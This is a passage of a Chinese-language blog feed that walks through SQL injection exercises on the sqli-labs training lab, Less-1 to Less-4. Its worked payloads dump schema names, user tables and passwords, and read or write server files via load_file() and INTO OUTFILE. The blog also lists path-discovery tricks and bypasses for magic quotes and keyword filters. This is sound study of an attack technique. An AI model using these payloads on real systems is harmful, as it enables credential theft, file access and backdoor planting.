        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="SQL注入文件读写及导出"><a href="#SQL注入文件读写及导出" class="headerlink" title="SQL注入文件读写及导出"></a>SQL注入文件读写及导出</h2><p>这里的load_file()和into outfile或into dumpfile函数都是Mysql数据库的内置函数。</p><p>1、<strong>load_file():读取函数</strong>：</p><p>以下代码实在数据库执行的源码进行文件读取：</p><pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;D:&#x2F;1.txt&#39;);这里的D可以用小写d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的d:&#x2F;1.txt文件路径中的斜杠要用 &#x2F; ,由于在sql语句中 \n是换行符，所以为了避免，这里的读取路径要使用 &#x2F; ；另一种可以通过\进行转义出  \ 。</p><p>执行如下代码：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,load_file(&#39;D:&#x2F;1.txt&#39;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已读取出1.txt文件的内容。</p><p><img src="/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/image-20220201182045161.png" alt="image-20220201182045161"></p><p>2、<strong>into outfile或into dumpfile:导出函数</strong>：</p><p>源码执行语句：</p><pre class="line-numbers language-none"><code class="language-none">select &#39;CTF1&#39; into outfile &#39;D:&#x2F;2.txt&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;CTF1&#39;  into outfile &#39;D:&#x2F;2.txt&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的写入语句，要写入的东西和路径都需要加 ‘’ 。</p><p>可以看到页面返回异常，但返回D盘查看文件，已将CTF1写入文件2.txt</p><p><img src="/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/image-20220201183145889.png" alt="image-20220201183145889"></p><p><img src="/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/image-20220201183319837.png" alt="image-20220201183319837"></p><p>SQL注入任意文件读取，这样的漏洞一旦出发，可以读取数据库管理员的账号密码，也可以通过写入操作将后门植入，提高权限。</p><p><strong>文件读取操作必须要知道文件的具体路径。</strong></p><hr><h2 id="路径获取的常见方法"><a href="#路径获取的常见方法" class="headerlink" title="路径获取的常见方法"></a>路径获取的常见方法</h2><p>报错显示：通过扫描工具或手工探测报错网页，会爆出该网站的真实路径；</p><p>遗留文件：例如 phpinfo.php文件，可以找到网站路径</p><p>漏洞报错：在搜索引擎根据网站使用的什么程序去搜索网站所在的爆路径的漏洞</p><p>平台配置文件：配置文件里会有网站的路径信息。</p><p>​                          敏感文件文章：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p><p>爆破：很难找到路径信息，按照常规思路去爆破。这是由于搭建网站的时候会有常见的路径，</p><p>​            例如：windows：                                              linux：</p><p>​                                           d:&#x2F;www&#x2F;……                                     &#x2F;var&#x2F;www&#x2F;……</p><hr><h2 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h2><p><strong>魔术引号开关：magic_quotes_gpc</strong>这个文件在php.ini目录下的文件</p><p><strong>魔术引号是为了防止任意文件读取的SQL注入。</strong></p><p>什么是魔术引号：当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 <a href="https://www.jb51.net/shouce/php5/zh/function.addslashes.html"><strong>addslashes()</strong></a> 作用完全相同。一个自动将进入 PHP 脚本的数据进行转义的过程。最好在编码时不要转义而在运行时根据需要而转义。</p><p><strong>魔术引号 【Warning：本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。】</strong></p><hr><h3 id="魔术引号的绕过："><a href="#魔术引号的绕过：" class="headerlink" title="魔术引号的绕过："></a>魔术引号的绕过：</h3><p>利用编码或宽字节绕过。</p><hr><h2 id="防注入策略"><a href="#防注入策略" class="headerlink" title="防注入策略"></a>防注入策略</h2><p>1.自带防御：魔术引导</p><p>2.内置函数;int等</p><p>3.自定义关键字：select，会对select,and,or等关键字进行过滤。（大小写混合可以尝试绕过过滤）</p><p>4.WAF防护软件：安全狗，宝塔等</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入字符型和数字型判断</title>
      <link href="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/"/>
      <url>/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在SQL注入中如何判断字符型注入还是数字型注入很重要，这里自己记录一下。</p><h2 id="数字型判定"><a href="#数字型判定" class="headerlink" title="数字型判定"></a>数字型判定</h2><p>1、<strong>and或者or</strong></p><p>假设数据库的执行语句是：select * from table where id&#x3D;$id</p><p>这里我以自己本地的sql靶场为例。</p><p>此时执行语句为：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回正常页面</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220131235010309.png" alt="image-20220131235010309"></p><p>若执行语句为：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面异常</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220131235143197.png" alt="image-20220131235143197"></p><p>这是因为这时数据库执行的语句为：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;1 and 1&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语句正确，逻辑错误。</p><hr><p>若执行语句为：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 or 1&#x3D;2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回页面正常</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220131235620782.png" alt="image-20220131235620782"></p><p>这时数据库执行的语句就是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;1 or 1&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语句正确，逻辑正确，页面返回正常。</p><p><strong>因此，可以使用and或or来判断字段是否是数字型，但因为字段型的and和or返回的结果都为正常页面，我们就不好通过or来进行比较，一般习惯于用and 1&#x3D;2,如果是数字型，返回错误，但如果是字符型，返回正确，这样两者之间就有了不同，有了比较。</strong></p><p>2、<strong>单引号判断</strong></p><p>假如此时语句为：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时数据库执行的语句就是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;1’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>单引号不匹配</strong>，语句正确，页面返回错误。</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220201000053200.png" alt="image-20220201000053200"></p><h2 id="字符型判定"><a href="#字符型判定" class="headerlink" title="字符型判定"></a>字符型判定</h2><p>1、<strong>and或or</strong></p><p>假设数据库的执行语句是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;’$id’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行以下语句时：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库执行的是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;‘1’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回正常</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220201000539553.png" alt="image-20220201000539553"></p><p>若执行and语句时：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时数据库执行的语句就是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;‘1 and 1&#x3D;2’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回正常</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220201000811749.png" alt="image-20220201000811749"></p><hr><p>若执行or时：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;3 or 1&#x3D;2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时数据库执行的语句就是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;‘3 or 1&#x3D;2’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回正常</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220201001024957.png" alt="image-20220201001024957"></p><p>对于字符型注入，不管是and或者or，执行结果都是一样的，都会返回id&#x3D;1的页面，这是由于数据库中id的类型是数值型，比如int型，而<strong>MySQL数据库在执行语句时是会自动进行类型转换的</strong>，输入的字符<strong>3 or 1&#x3D;2</strong>会在执行时被自动转换成int型的3，所以最终的执行语句还是<strong>select * from table where id&#x3D;‘3’</strong>，这是数据库的特性问题，后面的字符可以是<strong>任意的</strong>，不会影响查询，我们在3后面加上任意字符，比如3ctf，最后都会被转换为3来进行语句执行。</p><p>如图：<br><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220201002020011.png" alt="image-20220201002020011"></p><p>此时的执行语句是：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;4ctf #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到此时返回页面的变化。</p><p><strong>如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’4ctf’等类似的数据由于数据库里没有匹配项,查询结果为空。</strong></p><p>所以，如果字段是字符型的，那么我们使用<strong>and或者or</strong>来测试时页面返回都是正常的</p><p>2、<strong>单引号判断</strong></p><p>当执行一下语句时：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SQL语句就是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;‘1’’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单引号不匹配，语句错误，页面错误</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220201002452436.png" alt="image-20220201002452436"></p><p>注释多余的 ‘ 后：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行的SQL语句就是：</p><pre class="line-numbers language-none"><code class="language-none">select * from table where id&#x3D;‘1’ --+’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语句正确，页面正常</p><p><img src="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/image-20220201002733573.png" alt="image-20220201002733573"></p><p>这里与数字型判断不同的是，<strong>数字型判定尽管加上注释符，执行的SQL语句是select * from table where id&#x3D;1’ –+’ 因为单引号还是不匹配，语句还是错误的，页面还是返回错误。</strong></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-字符&amp;数字型</title>
      <link href="/2022/01/30/Less1-Less4/"/>
      <url>/2022/01/30/Less1-Less4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><p>###Less-1（字符型注入）</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先注入：</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>正常返回结果</p><p><img src="/2022/01/30/Less1-Less4/image-20220131000046458.png" alt="image-20220131000046458"></p><p>由于要判断注入点，如图：</p><p><img src="/2022/01/30/Less1-Less4/image-20220131000327595.png" alt="image-20220131000327595"></p><p>添加 ‘ 报错，证明有注入点，字符型，id&#x3D;1’报错是由于源码当中接收值的时候本身自己就是id&#x3D;’’的闭合形式，但由于我们自己强行在输入1的时候添加了1’，导致闭合之后形成了id&#x3D;’1’’，导致报错。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>执行下列语句进行绕过：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时正常回显</p><p><img src="/2022/01/30/Less1-Less4/image-20220131001026791.png" alt="image-20220131001026791"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接下来判断字段数，此处可以利用 order by。Order by 对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错。 ‘order by 4–+的结果显示结果超出。</p><p>执行以下语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131001526775.png" alt="image-20220131001526775"></p><p><img src="/2022/01/30/Less1-Less4/image-20220131001643103.png" alt="image-20220131001643103"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>知道字段数之后，判断回显点，利用union联合注入：</p><p>当 id 的数据在数据库中不存在时，（此时我们可以 id&#x3D;-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据。</p><p>执行以下语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131002543033.png" alt="image-20220131002543033"></p><p>此时执行语句应该为：</p><p>select ************ where id&#x3D;’-1’ union select 1,2,3–+’ LIMIT 0,1</p><p>回显点为2和3</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>接下来爆当前所在数据库名，爆版本号：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),version()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131004721237.png" alt="image-20220131004721237"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>根据版本特性，爆数据库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,schema_name,3  from information_schema.schemata  --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131010213078.png" alt="image-20220131010213078"></p><p>爆所有的数据库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3  from information_schema.schemata  --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131010522814.png" alt="image-20220131010522814"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>由于爆出所在数据库名security，爆表名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3  from information_schema.tables  --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131011039561.png" alt="image-20220131011039561"></p><p>当前所在库的表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3  from information_schema.tables  where table_schema&#x3D;&#39;security&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131011254814.png" alt="image-20220131011254814"></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>可以看到users这张表是存放用户名的表，接下来利用回显点3爆出列：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;) from information_schema.tables  where table_schema&#x3D;&#39;security&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131012812223.png" alt="image-20220131012812223"></p><p>爆表名语句：</p><pre class="line-numbers language-none"><code class="language-none">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆列名语句：</p><pre class="line-numbers language-none"><code class="language-none">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>可以看到列的字段中出现了username和password两个字段，接下来爆用户名和密码：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220131013610374.png" alt="image-20220131013610374"></p><p>爆用户名语句：</p><pre class="line-numbers language-none"><code class="language-none">select group_concat(username) from security.users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆密码语句：</p><pre class="line-numbers language-none"><code class="language-none">select group_concat(password) from security.users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Lees-2（数字型注入）"><a href="#Lees-2（数字型注入）" class="headerlink" title="Lees-2（数字型注入）"></a>Lees-2（数字型注入）</h3><p>##0x00</p><p>先进行判断，执行下列语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面正常</p><p><img src="/2022/01/30/Less1-Less4/image-20220201004057893.png" alt="image-20220201004057893"></p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>注入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面异常，可得知为数字型注入。</p><p><img src="/2022/01/30/Less1-Less4/image-20220201004229348.png" alt="image-20220201004229348"></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220201004438346.png" alt="image-20220201004438346"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面正常。</p><p><img src="/2022/01/30/Less1-Less4/image-20220201004525522.png" alt="image-20220201004525522"></p><h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>后续操作和字符型注入一样。</p><hr><h3 id="Lees-3"><a href="#Lees-3" class="headerlink" title="Lees-3"></a>Lees-3</h3><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>使用?id&#x3D;’进行尝试注入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入代码后，我们得到像这样的一个错误：</p><pre class="line-numbers language-none"><code class="language-none">MySQL server version for the right syntax to use near ””) LIMIT 0,1′<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里它意味着，开发者使用的查询是：</p><pre class="line-numbers language-none"><code class="language-none">Select login_name, select password from table where id&#x3D; (‘our input here’)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而源码当中也是如下：</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220201012339751.png" alt="image-20220201012339751"></p><h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>因此可以尝试这样注入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;1&#39;)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回正常</p><p><img src="/2022/01/30/Less1-Less4/image-20220201012811806.png" alt="image-20220201012811806"></p><h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>接下来可以判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220201014121063.png" alt="image-20220201014121063"></p><h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220201014321625.png" alt="image-20220201014321625"></p><h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>其实除了?id&#x3D;1’)注入以外，根据源码可以判断出其他的注入语句：</p><pre class="line-numbers language-none"><code class="language-none">&#39;) or &#39;1&#39;&#x3D;(&#39;1&#39;) or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一句**’) or ‘1’&#x3D;(‘1’**只要使SQL语句的语法正确，即使括号配对即可成功注入；</p><p>第二句) **or 1&#x3D;1 –+<strong>通过注释符把后面的</strong>‘)**注释掉即可。</p><p><img src="/2022/01/30/Less1-Less4/image-20220201015418821.png" alt="image-20220201015418821"></p><p><img src="/2022/01/30/Less1-Less4/image-20220201015108788.png" alt="image-20220201015108788"></p><h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 添加） 即’) </p><hr><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><p>使用以下代码进行注入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入代码后，我们得到像这样的一个错误：</p><pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQ L server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里它意味着，代码当中对 id 参数进行了 “” 和 () 的包装。</p><p>查看源代码：</p><pre class="line-numbers language-none"><code class="language-none">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一行id进行了””包装，之后第二行进行了()包装</p><p><img src="/2022/01/30/Less1-Less4/image-20220201021526614.png" alt="image-20220201021526614"></p><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>再用如下代码注入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回正常</p><p><img src="/2022/01/30/Less1-Less4/image-20220201021849009.png" alt="image-20220201021849009"></p><h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;)  order by 4--+<span aria-hidden="true" 